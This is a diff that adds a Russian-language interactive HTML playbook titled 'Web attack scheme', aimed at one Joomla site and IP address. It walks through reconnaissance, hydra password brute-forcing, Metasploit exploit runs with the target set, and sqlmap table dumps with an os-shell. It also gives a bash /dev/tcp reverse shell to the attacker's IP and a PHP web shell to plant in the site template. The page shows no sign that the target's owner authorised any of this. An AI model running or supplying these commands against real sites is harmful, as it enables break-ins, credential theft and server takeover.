@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Схема веб-атаки · siteexample</title>
+<style>
+  :root {
+    --bg: #0f0f10;
+    --panel: #1a1a1d;
+    --panel2: #222226;
+    --border: #2e2e33;
+    --text: #ececec;
+    --dim: #8e8e96;
+    --accent: #10a37f;
+    --accent-soft: #0d2b24;
+    --red: #ef4444;
+    --orange: #f0a34a;
+    --purple: #a78bfa;
+    --notes-w: 340px;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'Söhne', 'Segoe UI', system-ui, monospace;
+    background: var(--bg); color: var(--text);
+    margin: 0; padding: 24px calc(var(--notes-w) + 40px) 60px 16px;
+    transition: padding-right .25s ease;
+  }
+  body.notes-hidden { padding-right: 16px; }
+
+  h1 { color: var(--text); text-align: center; font-weight: 600; font-size: 22px; }
+  h1 span { color: var(--accent); }
+  .sub { text-align: center; color: var(--dim); font-size: 13px; margin-bottom: 30px; }
+
+  .step {
+    background: var(--panel); border: 1px solid var(--border);
+    border-radius: 16px; padding: 22px 24px;
+    margin: 0 auto 18px; max-width: 880px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.4);
+  }
+  .step h2 {
+    color: var(--text); font-size: 16px; font-weight: 600; margin: 0 0 14px;
+    display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  }
+  .badge {
+    background: var(--accent-soft); color: var(--accent);
+    border: 1px solid var(--accent); border-radius: 20px;
+    padding: 2px 10px; font-size: 11px; font-weight: 600;
+  }
+  .done {
+    background: var(--accent-soft); color: var(--accent);
+    border-radius: 6px; padding: 10px 14px; font-size: 13.5px; margin: 10px 0;
+    border-left: 3px solid var(--accent);
+  }
+  code {
+    background: var(--panel2); color: #6ee7b7; padding: 2px 7px;
+    border-radius: 6px; font-family: 'JetBrains Mono', Consolas, monospace; font-size: 13px;
+  }
+  pre {
+    background: var(--panel2); color: #d8f5e9; padding: 14px 16px;
+    border-radius: 10px; border: 1px solid var(--border);
+    font-family: 'JetBrains Mono', Consolas, monospace; font-size: 13px;
+    line-height: 1.6; overflow-x: auto; white-space: pre-wrap;
+  }
+  .branch {
+    color: var(--dim); font-size: 12.5px; margin: 14px 0 6px;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+  button {
+    background: var(--panel2); color: var(--text);
+    border: 1px solid var(--border); padding: 8px 16px;
+    margin: 5px 6px 5px 0; border-radius: 10px; cursor: pointer;
+    font-size: 13.5px; transition: all .15s;
+  }
+  button:hover { border-color: var(--accent); color: var(--accent); }
+  button.red:hover { border-color: var(--red); color: var(--red); }
+  .next {
+    display: none; margin-top: 12px; padding: 14px 16px;
+    background: var(--panel2); border: 1px solid var(--accent);
+    border-radius: 10px; font-size: 14px; line-height: 1.7;
+    animation: fade .25s ease;
+  }
+  @keyframes fade { from { opacity:0; transform: translateY(4px); } to { opacity:1; } }
+  .msf { border-color: var(--red); background: #1f1416; }
+  .msf h3 { color: var(--red); font-size: 14px; margin: 0 0 10px; }
+  .flag { color: var(--purple); }
+  .vuln { color: var(--orange); font-weight: 600; }
+  .arrow { text-align: center; color: var(--dim); font-size: 18px; margin: 4px 0 14px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13.5px; margin: 10px 0; }
+  td, th { border: 1px solid var(--border); padding: 8px 12px; text-align: left; }
+  th { background: var(--panel2); color: var(--accent); font-weight: 600; }
+  td b { color: var(--accent); }
+  .go { background: var(--accent); color: #fff; border: none; font-weight: 600; }
+  .go:hover { background: #0d8a6c; color: #fff; }
+
+  /* ══════ ПАНЕЛЬ ЗАМЕТОК ══════ */
+  #notes {
+    position: fixed; top: 0; right: 0; width: var(--notes-w); height: 100vh;
+    background: var(--panel); border-left: 1px solid var(--border);
+    display: flex; flex-direction: column; z-index: 100;
+    transition: transform .25s ease;
+  }
+  #notes.hidden { transform: translateX(100%); }
+  #notes header {
+    padding: 16px 18px 12px; border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  #notes header h2 {
+    margin: 0; font-size: 14px; font-weight: 600; color: var(--text);
+    display: flex; align-items: center; gap: 8px;
+  }
+  #notes header h2::before { content: '📝'; }
+  #notes textarea {
+    flex: 1; width: 100%; resize: none; border: none; outline: none;
+    background: var(--bg); color: var(--text);
+    font-family: 'JetBrains Mono', Consolas, monospace; font-size: 13px;
+    line-height: 1.75; padding: 16px 18px;
+    border-bottom: 1px solid var(--border);
+  }
+  #notes textarea::placeholder { color: #5a5a62; }
+  #notes footer {
+    padding: 12px 14px; display: flex; flex-wrap: wrap; gap: 8px;
+    border-top: 1px solid var(--border); align-items: center;
+  }
+  #notes footer button { margin: 0; padding: 7px 12px; font-size: 12.5px; }
+  #savedHint {
+    font-size: 11.5px; color: var(--accent); margin-left: auto;
+    opacity: 0; transition: opacity .25s;
+  }
+  #savedHint.show { opacity: 1; }
+  #notesToggle {
+    position: fixed; top: 16px; right: calc(var(--notes-w) + 16px);
+    z-index: 101; background: var(--panel); border: 1px solid var(--border);
+    color: var(--accent); border-radius: 10px; padding: 8px 14px;
+    font-size: 13px; cursor: pointer; transition: right .25s ease, background .15s;
+  }
+  #notesToggle:hover { background: var(--panel2); }
+  #notesToggle.hidden { right: 16px; }
+
+  @media (max-width: 760px) {
+    body { padding-right: 16px; }
+    #notes { width: 100%; height: 55vh; top: auto; bottom: 0; border-left: none;
+             border-top: 1px solid var(--border); border-radius: 16px 16px 0 0; }
+    #notes.hidden { transform: translateY(100%); }
+    #notesToggle { right: 16px; bottom: 16px; top: auto; }
+  }
+</style>
+</head>
+<body>
+
+<h1>🎯 <span>СХЕМА ВЕБ-АТАКИ</span> · siteexample</h1>
+<div class="sub">Joomla · Apache 2.4.69 · Debian · 185.224.89.46</div>
+
+<!-- ═══ ШАГ 1 ═══ -->
+<div class="step">
+<h2><span class="badge">Шаг 1</span> Сайт живой?</h2>
+<pre>curl -I https://www.siteexample.com</pre>
+<div class="done">✅ Результат: [200 OK] → сайт живой</div>
+<button class="go" onclick="go('step2')">Шаг 2 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 2 ═══ -->
+<div class="step" id="step2">
+<h2><span class="badge">Шаг 2</span> Порты (nmap)</h2>
+<pre>nmap -sV -sC -T4 --top-ports 1000 www.siteexample.com</pre>
+<p><span class="flag">-sV</span>=версии · <span class="flag">-sC</span>=скрипты · <span class="flag">-T4</span>=скорость (0–5)</p>
+<div class="branch">Развилки:</div>
+<button onclick="show('n2a')">Только 80/443</button>
+<div class="next" id="n2a">→ Шаг 3. Твой случай: Apache 2.4.69 на 443.</div>
+<button onclick="show('n2b')">22 SSH открыт</button>
+<div class="next" id="n2b">→ <code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://www.siteexample.com</code></div>
+<button onclick="show('n2c')">21 FTP / 3306 MySQL</button>
+<div class="next" id="n2c">→ FTP: <code>ftp www.siteexample.com</code> (anonymous) · MySQL: <code>mysql -h 185.224.89.46 -u root -p</code></div>
+<br><button class="go" onclick="go('step3')">Шаг 3 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 3 ═══ -->
+<div class="step" id="step3">
+<h2><span class="badge">Шаг 3</span> WAF?</h2>
+<pre>wafw00f -a https://www.siteexample.com</pre>
+<div class="branch">Развилки:</div>
+<button onclick="show('n3a')">is behind … (WAF есть)</button>
+<div class="next" id="n3a">→ тихий режим: <span class="flag">-T2</span>, <span class="flag">-t 10</span>, <span class="flag">-c 25</span>, sqlmap <span class="flag">--level 2 --risk 1</span></div>
+<button onclick="show('n3b')">No WAF detected</button>
+<div class="next" id="n3b">→ громкий режим: <span class="flag">-T4</span>, <span class="flag">-t 50</span>, <span class="flag">-c 100</span></div>
+<br><button class="go" onclick="go('step4')">Шаг 4 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 4 ═══ -->
+<div class="step" id="step4">
+<h2><span class="badge">Шаг 4</span> Что за сайт? <span class="badge">✅ выполнен</span></h2>
+<pre>whatweb -a 3 https://www.siteexample.com</pre>
+<div class="done">✅ Результат: <b>JOOMLA</b> · Apache 2.4.69 · Debian · IP 185.224.89.46</div>
+<pre>joomscan -u https://www.siteexample.com
+searchsploit apache 2.4
+nuclei -u http://185.224.89.46 -severity low,medium,high,critical</pre>
+<button class="go" onclick="go('step5')">Шаг 5 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 5 ═══ -->
+<div class="step" id="step5">
+<h2><span class="badge">Шаг 5</span> nikto <span class="badge">✅ выполнен</span></h2>
+<pre>nikto -h https://www.siteexample.com -Tuning 12389</pre>
+<table>
+<tr><th>Находка</th><th>Значит</th><th>Куда</th></tr>
+<tr><td><b>/administratie/</b></td><td>открытая админ-страница</td><td>Шаг 9 (hydra)</td></tr>
+<tr><td><b>/administrator/index.php</b></td><td>админка Joomla</td><td>Шаг 9 (hydra)</td></tr>
+<tr><td><b>/login/</b></td><td>вторая форма входа</td><td>Шаг 9</td></tr>
+<tr><td><b>/files/ /fotos/ /tmp/ /includes/</b></td><td>открытые каталоги</td><td>шелл после входа → /files/</td></tr>
+<tr><td><b>htaccess.txt</b></td><td>дефолтный конфиг Joomla не скрыт</td><td>открыть в браузере</td></tr>
+<tr><td>Cookie без secure flag</td><td>мелкая защита cookie</td><td>в отчёт</td></tr>
+<tr><td>нет CSP / HSTS / X-Content-Type-Options</td><td>заголовки отсутствуют</td><td>в отчёт (low severity)</td></tr>
+</table>
+<button class="go" onclick="go('step6')">Шаг 6 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 6 ═══ -->
+<div class="step" id="step6">
+<h2><span class="badge">Шаг 6</span> Скрытые папки (gobuster)</h2>
+<pre>gobuster dir -u https://www.siteexample.com \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,html,bak,zip -t 10</pre>
+<div class="branch">Развилки:</div>
+<button onclick="show('n6a')">/administrator 200</button>
+<div class="next" id="n6a">→ запомнили, идём в Шаг 9 после nuclei</div>
+<button onclick="show('n6b')">/.git найден</button>
+<div class="next" id="n6b">→ <code>git-dumper https://www.siteexample.com/.git ./src</code></div>
+<button onclick="show('n6c')">Одни 404</button>
+<div class="next" id="n6c">→ Шаг 7</div>
+<br><button class="go" onclick="go('step7')">Шаг 7 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 7 ═══ -->
+<div class="step" id="step7">
+<h2><span class="badge">Шаг 7</span> nuclei + переход в Metasploit</h2>
+<pre># 7а — общий прогон
+nuclei -update-templates
+nuclei -u https://www.siteexample.com \
+  -severity low,medium,high,critical -c 50 -rl 100 -o nuclei.txt
+
+# 7б — прицельный (Joomla + Apache):
+nuclei -u https://www.siteexample.com \
+  -tags joomla,cve,misconfig,apache \
+  -severity low,medium,high,critical
+
+# 7в — по прямому IP:
+nuclei -u http://185.224.89.46 -severity low,medium,high,critical</pre>
+
+<div class="branch">▼ Что нашёл nuclei → команда Metasploit</div>
+
+<button class="red" onclick="show('msf1')">[critical] [cve] Joomla RCE</button>
+<div class="next msf" id="msf1">
+<h3>Metasploit · <span class="vuln">[Joomla! Remote Code Execution — CVE-2023-23752 и др.]</span></h3>
+<pre>msfconsole -q
+msf6&gt; search joomla
+msf6&gt; use exploit/multi/http/joomla_*   ← по номеру из поиска
+msf6&gt; set RHOSTS 185.224.89.46
+msf6&gt; set RPORT 443
+msf6&gt; set SSL true
+msf6&gt; set LHOST &lt;твой_IP&gt;     ← ip a
+msf6&gt; set LPORT 4444
+msf6&gt; run</pre>
+<p><span class="flag">RHOSTS</span>=цель · <span class="flag">RPORT</span>=порт · <span class="flag">SSL</span>=https · <span class="flag">LHOST</span>=твой IP · <span class="flag">LPORT</span>=порт приёма шелла</p>
+<p>После <code>run</code> → meterpreter → <code>shell</code> → <code>whoami</code></p>
+</div>
+
+<button class="red" onclick="show('msf2')">[critical] [cve] Apache RCE</button>
+<div class="next msf" id="msf2">
+<h3>Metasploit · <span class="vuln">[Apache HTTP Server Path Traversal — CVE-2021-41773 / CVE-2021-42013]</span></h3>
+<pre>msfconsole -q
+msf6&gt; search apache 41773
+msf6&gt; use exploit/multi/http/apache_normalize_path_rce
+msf6&gt; set RHOSTS 185.224.89.46
+msf6&gt; set TARGETURI /
+msf6&gt; set LHOST &lt;твой_IP&gt;
+msf6&gt; run</pre>
+<p>Версия 2.4.69 свежая — скорее всего не сработает, тогда дальше по схеме.</p>
+</div>
+
+<button class="red" onclick="show('msf3')">[critical] [cve] Joomla Component SQLi</button>
+<div class="next msf" id="msf3">
+<h3>Metasploit · <span class="vuln">[Joomla Component SQL Injection — com_filman / com_fabrik и др.]</span></h3>
+<pre>msfconsole -q
+msf6&gt; search joomla sqli
+msf6&gt; use auxiliary/scanner/http/joomla_*_sqli
+msf6&gt; set RHOSTS 185.224.89.46
+msf6&gt; run</pre>
+<p>Или через sqlmap — Шаг 8.</p>
+</div>
+
+<button class="red" onclick="show('msf4')">[high] [misconfig] админка / файлы открыты</button>
+<div class="next msf" id="msf4">
+<h3>Metasploit · <span class="vuln">[Joomla Directory Listing / Exposure — misconfig]</span></h3>
+<p>Открой URL в браузере. Для перебора админки:</p>
+<pre>msfconsole -q
+msf6&gt; use auxiliary/scanner/http/joomla_bruteforce_login
+msf6&gt; set RHOSTS 185.224.89.46
+msf6&gt; set USERNAME admin
+msf6&gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6&gt; set TARGETURI /administrator/index.php
+msf6&gt; run</pre>
+<p><span class="flag">USERNAME</span>=логин · <span class="flag">PASS_FILE</span>=словарь · <span class="flag">TARGETURI</span>=путь формы логина</p>
+</div>
+
+<button onclick="show('n7none')">Пусто (No results found)</button>
+<div class="next" id="n7none">→ пусто ≠ сайт чист. Идём в Шаг 8.</div>
+<br><button class="go" onclick="go('step8')">Шаг 8 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 8 ═══ -->
+<div class="step" id="step8">
+<h2><span class="badge">Шаг 8</span> SQL-инъекция (sqlmap)</h2>
+<pre>sqlmap -u "https://www.siteexample.com/index.php?option=com_XXX&amp;param=1" \
+  --batch --level 3 --risk 1 --dbs</pre>
+<div class="branch">Развилки:</div>
+<button class="red" onclick="show('n8a')">is injectable</button>
+<div class="next msf" id="n8a">
+<h3><span class="vuln">[SQL Injection — подтверждена]</span></h3>
+<pre>sqlmap -u "…" --batch -D &lt;база&gt; -T users --dump
+sqlmap -u "…" --batch --os-shell</pre>
+<p>После <code>os-shell&gt;</code>:</p>
+<pre>nc -lvnp 4444                                        ← у себя
+os-shell&gt; bash -c "bash -i &gt;&amp; /dev/tcp/&lt;твой_IP&gt;/4444 0&gt;&amp;1"</pre>
+</div>
+<button onclick="show('n8b')">not injectable</button>
+<div class="next" id="n8b">→ Шаг 9</div>
+<br><button class="go" onclick="go('step9')">Шаг 9 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 9 ═══ -->
+<div class="step" id="step9">
+<h2><span class="badge">Шаг 9</span> Вход в админку Joomla</h2>
+<pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt www.siteexample.com \
+  http-post-form \
+  "/administrator/index.php:username=^USER^&amp;passwd=^PASS^&amp;option=com_login&amp;task=login:F=Username and password do not match" \
+  -t 4</pre>
+<p><span class="flag">-l</span>=логин · <span class="flag">-P</span>=словарь · <span class="flag">F=</span>=текст при неудаче (F12 в браузере) · <span class="flag">-t 4</span>=потоки</p>
+<div class="branch">Развилки:</div>
+<button class="red" onclick="show('n9a')">password: xxx</button>
+<div class="next" id="n9a">→ зайди в /administrator/ → Template editor → вставь <code>&lt;?php system($_GET['cmd']); ?&gt;</code> в шаблон → RCE. Или шелл в <b>/files/</b>.</div>
+<button onclick="show('n9b')">0 valid password found</button>
+<div class="next" id="n9b">→ другие логины: admin2016, webmaster, admin → или Шаг 10</div>
+<br><button class="go" onclick="go('step10')">Шаг 10 →</button>
+</div>
+<div class="arrow">▼</div>
+
+<!-- ═══ ШАГ 10 ═══ -->
+<div class="step" id="step10">
+<h2><span class="badge">Шаг 10</span> Всё дало 0? — Burp вручную</h2>
+<pre>burpsuite   # прокси 127.0.0.1:8080</pre>
+<p>Ищи: скрытые параметры (?debug=1), IDOR (user_id=5→1), JWT в cookie.</p>
+</div>
+
+<!-- ══════ ПАНЕЛЬ ЗАМЕТОК ══════ -->
+<button id="notesToggle" onclick="toggleNotes()">📝 Заметки</button>
+
+<aside id="notes">
+  <header>
+    <h2>Заметки</h2>
+    <button onclick="toggleNotes()" title="Свернуть">✕</button>
+  </header>
+  <textarea id="notesArea" placeholder="Пиши сюда находки, IP, пароли, вывод команд, идеи для отчёта…
+
+Пример:
+— nmap: 80,443 открыты
+— /administrator/ → hydra: 0 паролей
+— nuclei: ничего
+— TODO: прогнать sqlmap по com_XXX"></textarea>
+  <footer>
+    <button onclick="copyNotes()">Копировать</button>
+    <button onclick="downloadNotes()">Скачать .txt</button>
+    <button onclick="clearNotes()">Очистить</button>
+    <span id="savedHint">✓ сохранено</span>
+  </footer>
+</aside>
+
+<script>
+/* ---------- Раскрывающиеся блоки ---------- */
+function show(id){
+  const el = document.getElementById(id);
+  el.style.display = el.style.display === 'block' ? 'none' : 'block';
+}
+function go(id){ document.getElementById(id).scrollIntoView({behavior:'smooth'}); }
+
+/* ---------- Панель заметок ---------- */
+const KEY = 'siteexample_notes_v1';
+const area = document.getElementById('notesArea');
+const hint = document.getElementById('savedHint');
+let saveTimer = null;
+
+area.value = localStorage.getItem(KEY) || '';
+
+area.addEventListener('input', () => {
+  clearTimeout(saveTimer);
+  saveTimer = setTimeout(() => {
+    localStorage.setItem(KEY, area.value);
+    hint.classList.add('show');
+    setTimeout(() => hint.classList.remove('show'), 1200);
+  }, 400);
+});
+
+function toggleNotes(){
+  const n = document.getElementById('notes');
+  const t = document.getElementById('notesToggle');
+  n.classList.toggle('hidden');
+  t.classList.toggle('hidden');
+  document.body.classList.toggle('notes-hidden', n.classList.contains('hidden'));
+}
+
+function copyNotes(){
+  navigator.clipboard.writeText(area.value).then(() => {
+    hint.textContent = '✓ скопировано';
+    hint.classList.add('show');
+    setTimeout(() => { hint.classList.remove('show'); hint.textContent = '✓ сохранено'; }, 1200);
+  });
+}
+
+function downloadNotes(){
+  const blob = new Blob([area.value], {type: 'text/plain;charset=utf-8'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'siteexample_notes_' + new Date().toISOString().slice(0,10) + '.txt';
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+function clearNotes(){
+  if (confirm('Удалить все заметки? Отменить будет нельзя.')) {
+    area.value = '';
+    localStorage.removeItem(KEY);
+  }
+}
+
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
+    e.preventDefault();
+    localStorage.setItem(KEY, area.value);
+    hint.textContent = '✓ сохранено';
+    hint.classList.add('show');
+    setTimeout(() => hint.classList.remove('show'), 1200);
+  }
+});
+</script>
+</body>
+</html>
